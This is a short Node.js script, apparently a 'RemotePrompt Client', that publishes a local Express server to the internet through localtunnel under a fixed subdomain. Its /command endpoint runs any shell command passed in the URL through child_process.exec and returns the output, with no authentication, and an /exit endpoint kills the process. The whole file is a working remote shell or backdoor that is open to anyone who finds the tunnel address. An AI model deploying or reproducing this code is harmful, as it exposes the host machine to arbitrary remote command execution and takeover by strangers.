const localtunnel = require('localtunnel');
const bodyParser = require('body-parser');
const { exec } = require("child_process");
const express = require('express');
const { time } = require('console');

const app = express();
const port = 19256;
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const remoteprompt_code = "bruhthicc";

(async () => {
  const tunnel = await localtunnel({ port: port, subdomain: remoteprompt_code });
  app.get('/', (req, res) => {
    res.send('RemotePrompt Client')
  })

  app.get('/command', (req, res) => {
    let command = req.query.command;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send(`error: ${error.message}`)
            return;
        }
        if (stderr) {
            res.send(`stderr: ${stderr}`);
            return;
        }
        res.send(`${stdout}`);
    });
  })

  app.get('/exit', (req, res) => {
    process.exit(2)
  })

  app.listen(port, () => {
    console.log(`RemotePrompt Client listening at ${tunnel.url}`)
  })
})();